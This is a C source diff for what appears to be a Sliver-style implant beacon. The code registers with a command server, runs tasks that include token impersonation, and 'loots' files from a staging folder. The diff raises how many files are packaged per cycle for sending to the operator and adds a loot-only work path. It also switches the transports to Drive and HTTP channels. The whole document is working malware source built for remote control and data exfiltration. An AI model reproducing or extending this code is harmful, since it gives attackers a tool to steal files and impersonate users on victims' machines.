@@ -158,7 +158,6 @@ BOOL BeaconRegister
 	SecureZeroMemory(&SystemInfo, sizeof(SystemInfo));
 	SecureZeroMemory(ElementList, sizeof(ElementList));
 	SecureZeroMemory(&RegisterEnvelope, sizeof(RegisterEnvelope));
-
 	lpUUID = GetHostUUID();
 	if (lpUUID == NULL) {
 		goto CLEANUP;
@@ -275,15 +274,19 @@ PENVELOPE* BeaconHandleTaskList
 	WCHAR wszLogName[MAX_PATH];
 	LPSTR lpError = NULL;
 	PENVELOPE pRespEnvelope = NULL;
+	UINT64 uType = 0;
 
 	pResult = ALLOC(sizeof(PENVELOPE) * dwNumberOfTasks);
 	HandlerTable = GetSystemHandler();
 
 	for (i = 0; i < dwNumberOfTasks; i++) {
-		if (Tasks[i]->uType == MsgMakeTokenReq) {
+#ifdef _FULL
+		uType = Tasks[i]->uType;
+		if (uType == MsgMakeTokenReq || uType == MsgRevToSelf || uType == MsgImpersonateReq) {
 			pResult[i] = Tasks[i];
 			Tasks[i] = NULL;
 		}
+#endif
 
 		ReqHandler = HandlerTable[Tasks[i]->uType];
 		if (ReqHandler != NULL) {
@@ -374,37 +377,48 @@ VOID BeaconWork
 	PGLOBAL_CONFIG pConfig = NULL;
 	HANDLE hFind = INVALID_HANDLE_VALUE;
 	WIN32_FIND_DATAW FindData;
-	LPWSTR lpMark = NULL;
+	LPWSTR lpMask = NULL;
 	LPWSTR lpClonedPath = NULL;
 
 	pBeacon = pWrapper->pBeacon;
 	pConfig = pBeacon->pGlobalConfig;
-	TaskResults = BeaconHandleTaskList(pBeacon, pWrapper->pTaskList, pWrapper->dwNumberOfTasks);
+	if (pWrapper->pTaskList != NULL && pWrapper->dwNumberOfTasks > 0) {
+		TaskResults = BeaconHandleTaskList(pBeacon, pWrapper->pTaskList, pWrapper->dwNumberOfTasks);
+		for (i = 0; i < pWrapper->dwNumberOfTasks; i++) {
+			FreeEnvelope(pWrapper->pTaskList[i]);
+		}
+	}
+
 	if (pConfig->Loot) {
 		SecureZeroMemory(&FindData, sizeof(FindData));
-		lpMark = DuplicateStrW(pConfig->wszWarehouse, 2);
-		lstrcatW(lpMark, L"\\*");
-		hFind = FindFirstFileW(lpMark, &FindData);
+		lpMask = DuplicateStrW(pConfig->wszWarehouse, 2);
+		lstrcatW(lpMask, L"\\*");
+		hFind = FindFirstFileW(lpMask, &FindData);
 		if (hFind != INVALID_HANDLE_VALUE) {
 			do {
-				if (i >= 5) {
+				if (i > 10) {
 					break;
 				}
 
 				lpClonedPath = DuplicateStrW(pConfig->wszWarehouse, lstrlenW(FindData.cFileName) + 1);
 				lstrcatW(lpClonedPath, L"\\");
 				lstrcatW(lpClonedPath, FindData.cFileName);
-				pTempEnvelope = ALLOC(sizeof(ENVELOPE));
-				pTempEnvelope->uType = MsgLootFile;
-				pTempEnvelope->pData = ALLOC(sizeof(BUFFER));
-				pTempEnvelope->pData->pBuffer = ReadFromFile(lpClonedPath, &pTempEnvelope->pData->cbBuffer);
-				if (pTempEnvelope->pData->pBuffer != NULL && pTempEnvelope->pData->cbBuffer > 0) {
-					TaskResults = REALLOC(TaskResults, sizeof(PENVELOPE) * (pWrapper->dwNumberOfTasks + 1));
+				pTempEnvelope = MarshalLootedFile(lpClonedPath);
+				if (pTempEnvelope != NULL) {
+					if (TaskResults == NULL) {
+						TaskResults = ALLOC(sizeof(PENVELOPE));
+					}
+					else {
+						TaskResults = REALLOC(TaskResults, sizeof(PENVELOPE) * (pWrapper->dwNumberOfTasks + 1));
+					}
+
+#ifdef _DEBUG
+					PrintFormatA("Write Envelope:\n");
+					HexDump(pTempEnvelope->pData->pBuffer, pTempEnvelope->pData->cbBuffer);
+#endif
+
 					TaskResults[pWrapper->dwNumberOfTasks++] = pTempEnvelope;
 					i++;
-				}
-				else {
-					FreeEnvelope(pTempEnvelope);
 				}
 
 				FREE(lpClonedPath);
@@ -420,10 +434,9 @@ CLEANUP:
 	FreeEnvelope(pSendEnvelope);
 	for (i = 0; i < pWrapper->dwNumberOfTasks; i++) {
 		FreeEnvelope(TaskResults[i]);
-		FreeEnvelope(pWrapper->pTaskList[i]);
 	}
 
-	FREE(lpMark);
+	FREE(lpMask);
 	FREE(TaskResults);
 	FREE(pWrapper->pTaskList);
 	if (dwOldInterval != pBeacon->dwInterval) {
@@ -514,7 +527,7 @@ CONTINUE:
 			goto CLEANUP;
 		}
 #endif
-		if (dwNumberOfAttempts >= pConfig->dwMaxFailure) {
+		if (dwNumberOfAttempts >= pConfig->dwMaxConnectionErrors) {
 			goto CLEANUP;
 		}
 
@@ -534,6 +547,7 @@ CONTINUE:
 			pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
 			pWrapper->pTaskList = BeaconTask->EnvelopeList;
 			pWrapper->dwNumberOfTasks = BeaconTask->dwNumberOfEnvelopes;
+#ifdef _FULL
 			for (j = 0; j < pWrapper->dwNumberOfTasks; j++) {
 				uType = pWrapper->pTaskList[j]->uType;
 				if (uType == MsgMakeTokenReq || uType == MsgRevToSelf || uType == MsgImpersonateReq) {
@@ -566,14 +580,21 @@ CONTINUE:
 					pReturnedEnvelope->uType = uType;
 					pWrapper->pTaskList[j] = pReturnedEnvelope;
 					DeleteFileW(wszLogName);
-
 				}
 			}
+#endif
+
 			pWrapper->hEvent = hEvent;
 			pWrapper->pBeacon = pBeacon;
-
 			FREE(BeaconTask->lpInstanceID);
 			FREE(BeaconTask);
+			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
+			TpPostWork(pWork);
+		}
+		else if (pConfig->Loot) {
+			pWrapper = ALLOC(sizeof(BEACON_TASKS_WRAPPER));
+			pWrapper->hEvent = hEvent;
+			pWrapper->pBeacon = pBeacon;
 			pWork = CreateThreadpoolWork((PTP_WORK_CALLBACK)BeaconWork, pWrapper, &pSliverPool->CallBackEnviron);
 			TpPostWork(pWork);
 		}
@@ -615,21 +636,21 @@ PSLIVER_BEACON_CLIENT BeaconInit
 	
 	if (pGlobalConfig->Protocol == Drive) {
 		pBeacon->Init = (CLIENT_INIT)DriveInit;
-		pBeacon->Start = DriveStart;
-		pBeacon->Send = DriveSend;
-		pBeacon->Receive = DriveRecv;
-		pBeacon->Close = DriveClose;
-		pBeacon->Cleanup = FreeDriveClient;
+		pBeacon->Start = (CLIENT_START)DriveStart;
+		pBeacon->Send = (SEND_ENVELOPE)DriveSend;
+		pBeacon->Receive = (RECV_ENVELOPE)DriveRecv;
+		pBeacon->Close = (CLIENT_CLOSE)DriveClose;
+		pBeacon->Cleanup = (CLIENT_CLEANUP)FreeDriveClient;
 	}
 	else if (pGlobalConfig->Protocol == Http) {
 		pBeacon->Init = (CLIENT_INIT)HttpInit;
-		pBeacon->Start = HttpStart;
-		pBeacon->Send = HttpSend;
-		pBeacon->Receive = HttpRecv;
-		pBeacon->Close = HttpClose;
-		pBeacon->Cleanup = FreeHttpClient;
+		pBeacon->Start = (CLIENT_START)HttpStart;
+		pBeacon->Send = (SEND_ENVELOPE)HttpSend;
+		pBeacon->Receive = (RECV_ENVELOPE)HttpRecv;
+		pBeacon->Close = (CLIENT_CLOSE)HttpClose;
+		pBeacon->Cleanup = (CLIENT_CLEANUP)FreeHttpClient;
 	}
-	else if (pGlobalConfig->Protocol == Tcp) {
+	/*else if (pGlobalConfig->Protocol == Tcp) {
 		pBeacon->Init = (CLIENT_INIT)TcpInit;
 		pBeacon->Start = TcpStart;
 		pBeacon->Send = TcpSend;
@@ -644,7 +665,7 @@ PSLIVER_BEACON_CLIENT BeaconInit
 		pBeacon->Receive = PipeRecv;
 		pBeacon->Close = PipeClose;
 		pBeacon->Cleanup = PipeCleanup;
-	}
+	}*/
 	else {
 		FREE(pBeacon);
 		pBeacon = NULL;
